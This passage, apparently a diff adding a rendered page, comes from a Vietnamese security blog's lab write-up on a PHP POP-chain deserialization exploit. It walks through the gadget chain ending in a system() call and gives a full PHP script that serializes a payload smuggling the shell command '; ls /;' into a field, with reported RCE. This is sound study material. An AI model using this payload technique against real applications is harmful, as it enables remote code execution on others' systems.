+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">memo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Note</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">.</span> <span class="s2">&#34;say hello&#34;</span><span class="p">,</span> <span class="s1">&#39;test_whale&#39;</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p><strong><code>Note::__toString()</code> sẽ gọi <code>record()</code></strong>: <code>__toString()</code> trong <code>Note</code> gọi <code>record($this-&gt;whale, $this-&gt;content)</code> trước khi trả về chuỗi. <code>__toString()</code> được gọi khi đối tượng bị ép sang chuỗi. Ta lợi dụng <code>$this-&gt;name</code> làm đối tượng của note sẽ bị ép sang chuỗi khi concat <code>&quot;say hello&quot;</code> ở dòng 9.</p>
+</li>
+<li>
+<p><strong><code>record()</code> truy xuất thuộc tính động trên <code>$whale</code></strong>: Trong <code>record()</code> có dòng:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$test</span> <span class="o">=</span> <span class="nv">$whale</span><span class="o">-&gt;</span><span class="nv">$content</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nếu <code>$whale</code> là một object <code>Whale</code> và <code>$content</code> không khớp thuộc tính tồn tại, PHP sẽ gọi magic <code>Whale::__get($attribute)</code>.</p>
+</li>
+<li>
+<p><strong><code>Whale::__get()</code> thực thi <code>system()</code></strong>: <code>__get()</code> của <code>Whale</code> chứa:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">system</span><span class="p">(</span><span class="s1">&#39;echo &#34;&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">.</span><span class="s1">&#39;&#34; &gt;&gt; log.txt&#39;</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Vì <code>system()</code> chạy shell, nếu <code>$this-&gt;name</code> chứa ký tự phá vỡ lệnh (ví dụ <code>&quot;; ls /; echo &quot;</code>), attacker có thể chèn và thực thi lệnh shell dẫn tới RCE.</p>
+</li>
+</ol>
+<h2 class="heading-element" id="exploit"><span>Exploit</span>
+  <a href="#exploit" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Tạo 1 file tương tự file gốc nhưng chứa code tạo serialize:</p>
+<div class="highlight" title="lab_copy.php"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="hl"><span class="lnt"> 6
+</span></span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="hl"><span class="lnt">52
+</span></span><span class="hl"><span class="lnt">53
+</span></span><span class="hl"><span class="lnt">54
+</span></span><span class="lnt">55
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">private</span> <span class="nv">$memo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line hl"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span> <span class="k">new</span> <span class="nx">Note</span><span class="p">(</span><span class="s2">&#34;Top2&#34;</span><span class="p">,</span><span class="k">new</span> <span class="nx">Whale</span><span class="p">((</span><span class="s1">&#39;&#34;; ls /; echo &#34;&#39;</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">memo</span><span class="o">=</span><span class="k">new</span> <span class="nx">Note</span><span class="p">(</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">name</span><span class="o">.</span><span class="s2">&#34;say hello&#34;</span><span class="p">,</span> <span class="s1">&#39;test_whale&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$content</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">memo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Note</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$whale</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span> <span class="nv">$whale</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="o">=</span><span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">whale</span><span class="o">=</span><span class="nv">$whale</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">record</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">whale</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="s1">&#39;Record for &#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">whale</span><span class="o">.</span><span class="s1">&#39; is : &#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="nf">record</span><span class="p">(</span><span class="nv">$whale</span><span class="p">,</span> <span class="nv">$content</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">//check whether it&#39;s an attribute
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nv">$test</span><span class="o">=</span><span class="nv">$whale</span><span class="o">-&gt;</span><span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nv">$test</span><span class="o">!=</span><span class="k">NULL</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">			<span class="k">echo</span><span class="p">(</span><span class="s2">&#34;It&#39;s probably an attribute&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Whale</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">private</span> <span class="nv">$note</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="nf">take_note</span><span class="p">(</span><span class="nv">$note</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">note</span><span class="o">=</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;Y/m/d H:i:s&#34;</span><span class="p">)</span><span class="o">.</span><span class="nv">$note</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$attribute</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">system</span><span class="p">(</span><span class="s1">&#39;echo &#34;&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">.</span><span class="s1">&#39;&#34; &gt;&gt; log.txt&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$attribute</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line hl"><span class="cl"><span class="nv">$u</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
+</span></span><span class="line hl"><span class="cl"><span class="nv">$searialize</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$u</span><span class="p">);</span>
+</span></span><span class="line hl"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span> <span class="nv">$searialize</span> <span class="o">.</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Chạy file này và copy chuỗi base64 trả về:</p>
+<p><figure><a class="lightgallery" href="/posts/2025-11-11-pop-chain-lab1/base64_return.png" title="Chuỗi base64 trả về" data-thumbnail="/posts/2025-11-11-pop-chain-lab1/base64_return.png" data-sub-html="<h2>Base64</h2><p>Chuỗi base64 trả về</p>"><img loading="lazy" src='/posts/2025-11-11-pop-chain-lab1/base64_return.png' alt="Base64" height="450" width="1542"></a><figcaption class="image-caption">Chuỗi base64 trả về</figcaption>
+  </figure></p>
+<p>Gửi request theo cú pháp challenge</p>
+<p><figure><a class="lightgallery" href="/posts/2025-11-11-pop-chain-lab1/result.png" title="RCE thành công" data-thumbnail="/posts/2025-11-11-pop-chain-lab1/result.png" data-sub-html="<h2>RCE</h2><p>RCE thành công</p>"><img loading="lazy" src='/posts/2025-11-11-pop-chain-lab1/result.png' alt="RCE" height="593" width="1542"></a><figcaption class="image-caption">RCE thành công</figcaption>
+  </figure></p></div><hr class="awesome-hr" />
+    <h2 id="see-also">Nội dung liên quan</h2>
+    <ul><li>
+          <a href="/vi/posts/2025-11-08-cve-2025-39557/" title="CVE-2025-39557 Analysis &amp; POC">CVE-2025-39557 Analysis &amp; POC</a></li><li>
+          <a href="/vi/posts/2025-11-07-cve-2025-47577/" title="CVE-2025-47577 Analysis &amp; POC">CVE-2025-47577 Analysis &amp; POC</a></li><li>
+          <a href="/vi/posts/2025-11-06-cve-2025-10647/" title="CVE-2025-10647 Analysis &amp; POC">CVE-2025-10647 Analysis &amp; POC</a></li><li>
+          <a href="/vi/posts/2025-11-05-cve-2025-10147/" title="CVE-2025-10147 Analysis &amp; POC">CVE-2025-10147 Analysis &amp; POC</a></li><li>
+          <a href="/vi/posts/2025-11-04-cve-2025-62065/" title="CVE-2025-62065 Analysis &amp; POC">CVE-2025-62065 Analysis &amp; POC</a></li><li>
+          <a href="/vi/posts/2025-11-03-cve-2025-2940/" title="CVE-2025-2940 Analysis &amp; POC">CVE-2025-2940 Analysis &amp; POC</a></li><li>
+          <a href="/vi/posts/2025-11-02-cve-2025-1043/" title="CVE-2025-1043 Analysis &amp; POC">CVE-2025-1043 Analysis &amp; POC</a></li><li>
+          <a href="/vi/posts/2025-11-01-cve-2025-52713/" title="CVE-2025-52713 Analysis &amp; POC">CVE-2025-52713 Analysis &amp; POC</a></li><li>
+          <a href="/vi/posts/2025-10-31-cve-2025-60161/" title="CVE-2025-60161 Analysis &amp; POC">CVE-2025-60161 Analysis &amp; POC</a></li><li>
+          <a href="/vi/posts/2025-10-30-cve-2025-11128/" title="CVE-2025-11128 Analysis &amp; POC">CVE-2025-11128 Analysis &amp; POC</a></li></ul><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod"><span title="Cập nhật ngày 2025-11-11 19:00:00">Cập nhật ngày 2025-11-11&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/vi/posts/2025-11-11-pop-chain-lab1/index.md" title="Đọc với định dạng Markdown" class="link-to-markdown">Đọc với định dạng Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-11-11-POP-CHAIN-LAB1/index.vi.md?plain=1" title="Xem mã nguồn"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">Xem mã nguồn</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts/2025-11-11-POP-CHAIN-LAB1/index.vi.md" title="Chỉnh sửa trang này"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Chỉnh sửa trang này</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20POP&#43;Chain&#43;Analysis&#43;%26&#43;Exploit&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cPOP&#43;Chain&#43;Analysis&#43;%26&#43;Exploit%7c%0A%7cURL%7chttp://localhost:1313/vi/posts/2025-11-11-pop-chain-lab1/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-11-11-POP-CHAIN-LAB1/index.vi.md?plain=1%7c" title="Báo cáo lỗi"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Báo cáo lỗi</a></span><span><a href="vscode://file//home/w41/work/project/w41bu1.github.io/content/posts/2025-11-11-POP-CHAIN-LAB1/index.vi.md" title="Mở trong trình chỉnh sửa"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Mở trong trình chỉnh sửa</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="twitter" data-url="http://localhost:1313/vi/posts/2025-11-11-pop-chain-lab1/" data-title="POP Chain Analysis &amp; Exploit" data-hashtags="analyst,plugin,arbitrary file upload"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/posts/2025-11-11-pop-chain-lab1/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Chia sẻ trên Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/vi/posts/2025-11-11-pop-chain-lab1/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/posts/2025-11-11-pop-chain-lab1/" data-title="POP Chain Analysis &amp; Exploit"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/vi/tags/analyst/" class="post-tag" title="Nhãn - Analyst">Analyst</a><a href="/vi/tags/plugin/" class="post-tag" title="Nhãn - Plugin">Plugin</a><a href="/vi/tags/arbitrary-file-upload/" class="post-tag" title="Nhãn - Arbitrary File Upload">Arbitrary File Upload</a></section>
+    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/vi/posts/2025-11-10-cve-2023-48777/" class="post-nav-item" rel="prev" title="CVE-2023-48777 Analysis &amp; POC"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2023-48777 Analysis &amp; POC</a><a href="/vi/posts/2025-11-11-cve-2025-47637/" class="post-nav-item" rel="next" title="CVE-2025-47637 Analysis &amp; POC">CVE-2025-47637 Analysis &amp; POC<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Nội dung"><h2 class="toc-title">Nội dung&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="github.com/w41bu1">Bui Van Y</a></span><span class="license footer-divider">w41bu1</span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='Tổng khách truy cập'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Tổng lượt truy cập'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div><div class="footer-line beian"><span class="gov"><i class="fa-solid fa-user-secret"></i></span><span class="icp footer-divider"><i class="fa-solid fa-bug"></i></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Lên trên"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">Trang web này hoạt động tốt nhất khi JavaScript được kích hoạt.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/vi/posts/2025-11-11-pop-chain-lab1/config/page.js" defer></script><script src="/js/theme.min.js" defer></script><script src="/js/flyfish.min.js" defer></script></body>
+</html>
